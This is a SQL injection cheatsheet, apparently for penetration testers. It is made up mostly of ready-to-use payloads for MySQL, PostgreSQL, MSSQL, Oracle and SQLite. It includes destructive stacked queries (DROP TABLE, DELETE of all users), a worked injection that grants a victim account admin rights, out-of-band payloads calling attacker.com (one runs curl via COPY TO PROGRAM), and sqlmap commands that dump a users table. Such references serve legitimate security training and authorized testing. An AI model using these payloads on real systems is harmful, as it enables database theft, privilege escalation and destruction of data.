# SQL Injection Cheatsheet

## Detection

SQL injection can be detected using a variety of techniques, each suited to different backend behaviors and application logic. Always test safely and only on authorized systems.

### Error-based
- Inject invalid syntax and look for database error messages in the response (HTML, JSON, or stack trace).
- **Payloads:**
	- `'"
	- `')`
	- `" or 1=1--`
	- `') OR ('1'='1`
- **Common error strings:**
	- MySQL: `You have an error in your SQL syntax`, `Warning: mysql_`, `MySQL server version for the right syntax`
	- PostgreSQL: `PG::SyntaxError`, `unterminated quoted string`, `ERROR: syntax error at or near`
	- MSSQL: `Unclosed quotation mark`, `Microsoft OLE DB Provider for SQL Server`, `Incorrect syntax near`
	- Oracle: `ORA-00933`, `ORA-01756`, `quoted string not properly terminated`
	- SQLite: `SQLite3::SQLException`, `unrecognized token`, `near "...": syntax error`

### Union-based
- Inject `UNION SELECT` payloads to combine results from another query. If successful, the response will include data from the injected query (e.g., your string, version(), user(), etc.).
- Vary the number of columns in the UNION until the query succeeds (no error or different response).
- **Payloads:**
	- `' UNION SELECT NULL--`
	- `' UNION SELECT NULL,NULL--`
	- `' UNION SELECT 1,2,3--`
	- `' UNION SELECT 'abc',version()--`
	- `ORDER BY 1--`, `ORDER BY 2--` (to find column count)

### Boolean-based (blind)
- Inject payloads that change a condition (e.g., `1=1` vs `1=2`) and observe differences in the application's response (content, length, error, or behavior).
- **Payloads:**
	- `1 AND 1=1--` (should return normal page)
	- `1 AND 1=2--` (should return different/empty page)
	- `' OR 'a'='a'--`
	- `' OR 'a'='b'--`
	- `1' AND ASCII(SUBSTR((SELECT database()),1,1))=100--` (character extraction)

### Time-based (blind)
- Inject payloads that cause a time delay if the condition is true (e.g., `SLEEP(5)`, `pg_sleep(5)`, `WAITFOR DELAY '0:0:5'`).
- If the server response is delayed, the injection point is likely vulnerable.
- **Payloads:**
	- MySQL: `1' OR IF(1=1,SLEEP(5),0)--`
	- PostgreSQL: `1' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--`
	- MSSQL: `1'; WAITFOR DELAY '0:0:5'--`
	- Oracle: `1' OR 1=1 AND dbms_pipe.receive_message('a',5) IS NOT NULL--`

### Stacked queries
- Some databases (e.g., MySQL with multi-statements, SQLite, MSSQL) allow multiple queries separated by `;`.
- Inject `; <second query>` to see if you can run additional statements (e.g., `1; UPDATE users SET is_admin=1 WHERE username='victim'--`).
- **Payloads:**
	- `1; SELECT version();--`
	- `1; UPDATE users SET is_admin=1 WHERE username='victim'--`
	- `1'; DROP TABLE users--`
- **Detection:** observe side effects (data changes, new users, etc.) or error messages about multiple statements.

### Out-of-band (OOB)
- Some SQLi can be detected by triggering the database to make an external request (DNS, HTTP) to a server you control.
- **Payloads:**
	- MySQL: `LOAD_FILE('\\attacker.com\file')`
	- MSSQL: `; exec master..xp_dirtree '//attacker.com/share'--`
	- Oracle: `UTL_HTTP.REQUEST('http://attacker.com/')`
	- PostgreSQL: `COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/'`
- **Detection:** monitor your external server for callbacks.

### Data-modifying (UPDATE/DELETE)
- Inject payloads that modify or delete data (e.g., `UPDATE`, `DELETE`, `INSERT`).
- **Payloads:**
	- `1'; UPDATE users SET is_admin=1 WHERE username='victim'--`
	- `1'; DELETE FROM users WHERE 1=1--`
	- `1' OR '1'='1` (in DELETE statement)
- **Detection:** observe changes in the application (e.g., user promoted to admin, records deleted, profile info changed).

### Database fingerprinting (detecting DBMS type)
- Identifying the backend DBMS helps tailor payloads for maximum effect.
- **Techniques:**
	- Look for error messages (see above for DB-specific strings).
	- Use version functions in UNION or error-based payloads:
		- MySQL: `SELECT version()`, `SELECT @@version`
		- PostgreSQL: `SELECT version()`, `SELECT current_database()`
		- MSSQL: `SELECT @@version`, `SELECT db_name()`
		- Oracle: `SELECT banner FROM v$version`, `SELECT * FROM v$version`
		- SQLite: `SELECT sqlite_version()`
	- Use DBMS-specific syntax:
		- MySQL: `SLEEP(5)`, `-- ` (double dash with space)
		- PostgreSQL: `pg_sleep(5)`, `--` (double dash, no space)
		- MSSQL: `WAITFOR DELAY '0:0:5'`, `;` for stacked queries
		- Oracle: `dbms_pipe.receive_message('a',5)`, `--`
		- SQLite: `sqlite_version()`, `;` for stacked queries
- **Fingerprint payloads:**
	- `' AND 1=CAST(version() AS int)--` (MySQL/PostgreSQL)
	- `' AND 1=CAST(version() AS varchar)--` (MSSQL)
	- `' AND 1=UTL_INADDR.get_host_address('localhost')--` (Oracle)
	- `' AND 1=sqlite_version()--` (SQLite)

### General tips
- Compare HTTP status codes, content length, and response content for injected vs. normal requests.
- Use Burp Suite's Comparer, Diff, or Intruder to automate detection.
- Always record the exact payload and response for reporting.

## Common test payloads

- Test for injection:

```sql
' OR '1'='1
' OR '1'='1' -- 
' OR '1'='1' /*
"
'") OR ('1'='1
```

- Error-based (MySQL):

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
```

- Union-based example (find column count):

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

- Time-based (MySQL):

```sql
' OR IF(1=1,SLEEP(5),0) -- 
```

## Extraction techniques

## Exploiting with UPDATE and DELETE

While most SQLi labs focus on data extraction (SELECT, UNION), some real-world vulnerabilities allow you to modify or delete data using UPDATE or DELETE statements. This is especially relevant for injection points in form fields or API endpoints that are used to update or remove records.

- **UPDATE injection example:**

Suppose the backend query is:

```sql
UPDATE users SET email = '$email' WHERE id = $id;
```

If `$email` is injectable, you can terminate the value and inject your own UPDATE:

```
test@example.com', is_admin=1 WHERE username='victim'--
```

Resulting query:

```sql
UPDATE users SET email = 'test@example.com', is_admin=1 WHERE username='victim'--' WHERE id = $id;
```

This sets `is_admin=1` for user `victim`.

- **DELETE injection example:**

Suppose the backend query is:

```sql
DELETE FROM users WHERE id = '$id';
```

If `$id` is injectable, you can delete all users:

```
1' OR '1'='1
```

Resulting query:

```sql
DELETE FROM users WHERE id = '1' OR '1'='1';
```

Or, to delete a specific user:

```
1'; DELETE FROM users WHERE username='victim'--
```

**Warning:** These payloads are destructive. Only use on authorized test systems.

**Tips:**
- Look for injection points in update/delete forms, admin panels, or API endpoints.
- Use stacked queries if the backend allows (e.g., `1'; UPDATE users SET is_admin=1 WHERE username='victim'--`).
- Some databases (e.g., MySQL with multi-statement enabled, or SQLite) allow stacked queries; others (like most modern PostgreSQL) do not by default.


- Use `UNION SELECT` with `CONCAT()` to combine columns for extraction.
- For blind SQLi, enumerate characters using binary search on ASCII values to reduce requests.
- Extract schema from `information_schema.tables` and `information_schema.columns`.

## SQLmap quick flags

- Basic run:

```bash
sqlmap -u "http://target/vuln.php?id=1" --batch
```

- Force GET/POST:

```bash
sqlmap -u "http://target/vuln.php?id=1" --data="id=1" --risk=3 --level=5 --batch
```

- Dump a specific table:

```bash
sqlmap -u "http://target/vuln.php?id=1" -D dbname -T users --dump
```

## Practical notes

- Always test predictable, low-impact payloads first.
- Watch for WAFs and input filtering — try encoding, case variations, and alternative functions.
- When practicing on PortSwigger Academy, take careful notes on the exact request/response differences that indicate boolean/time behaviors.
